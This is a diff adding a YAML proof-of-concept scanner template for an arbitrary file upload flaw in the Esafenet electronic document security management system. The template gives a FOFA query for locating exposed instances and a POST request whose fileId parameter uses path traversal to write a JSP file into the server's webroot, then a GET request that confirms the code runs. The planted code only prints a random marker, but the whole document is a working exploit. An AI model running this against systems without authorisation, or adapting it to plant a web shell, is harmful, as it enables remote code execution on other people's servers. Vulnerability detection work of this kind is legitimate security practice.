@@ -1,0 +1,20 @@
+id: poc-yaml-yisaitong-esafenet-decryptapplicationservice2-anyfile-upload
+info:
+  name: 亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/{{.t1}}.jsp
+  data: <%out.print("{{.t2}}");%>
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /CDGServer3/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
